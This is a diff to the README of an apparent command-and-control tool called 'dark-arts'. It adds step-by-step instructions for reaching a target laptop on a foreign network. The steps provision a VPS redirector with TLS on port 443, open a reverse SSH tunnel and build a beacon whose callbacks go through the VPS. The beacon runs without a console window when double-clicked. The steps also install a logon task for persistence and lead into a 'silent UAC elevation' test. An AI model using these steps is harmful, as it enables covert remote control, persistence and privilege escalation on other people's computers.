@@ -256,7 +256,26 @@ Copy `lab\laptop-pkg\beacon.exe` to the laptop and double-click it (no console w
 dark-arts> sessions          # the laptop's sid shows a recent last-seen
 ```
 
-The walkthrough covers a same-network laptop. For a target on foreign WiFi or a different network, run `sshkey` + `redirector [-Reverse] <user@vps>` first (see [Cross-network deployment](#cross-network-deployment-vps-redirector)) — it provisions the VPS and builds the package with the right edge list automatically.
+The walkthrough covers a same-network laptop. For a target on foreign WiFi or a different network, use the cross-network variant below (it replaces steps 5–6).
+
+### 6b. Cross-network variant (VPS redirector) — instead of steps 5–6
+
+**Before the console (one-time VPS prep):**
+
+1. Create a Debian/Ubuntu VPS and open **TCP 443** (and 80 while certbot runs) in the *provider* firewall — OCI security list, GCP VPC rule (`gcloud compute firewall-rules create darkarts-443 --allow tcp:443,tcp:80 ...`); a VM-level ufw rule alone is not enough.
+2. `dark-arts> sshkey` — paste the printed public key into the VPS's `authorized_keys` (or the provider's launch form).
+3. Give the SSH user passwordless sudo (`echo "<user> ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/<user>`) or `redirector` dies at `apt-get update`.
+
+**In the console (lab already up):**
+
+4. `dark-arts> redirector -Reverse <user@vps> [domain]` — one command provisions nginx (TLS :443 → upstream `127.0.0.1:7443`), starts the outbound SSH tunnel window (`ssh -R 7443`), verifies `https://<vps>/healthz` from the VPS, then **builds + registers the package** with edges `https://<vps>:443,http://<lab-ip>:7443`.
+5. Keep the tunnel window open; for persistence across reboots: `dark-arts> tunnel-install <user@vps>` (logon scheduled task).
+6. Copy `lab\laptop-pkg\beacon.exe` to the laptop and double-click it — works from **any** network.
+7. Continue with step 7 (`uactest`) below.
+
+Plain (non-reverse) mode: `dark-arts> redirector <user@vps> [domain]` instead — requires the lab host reachable from the VPS on TCP 7443 (router port-forward; verify with `nc -vz <lab-ip> 7443` from the VPS) and the Windows firewall rule (the console adds it when elevated).
+
+If step 4 verifies with `healthz returned 502`: the tunnel wasn't up yet — check the tunnel window for errors and confirm the listener on the VPS with `ss -tlnp | grep 7443`, then re-run (the whole `redirector -Reverse` run is idempotent).
 
 ### 7. Test the silent UAC elevation channel
 
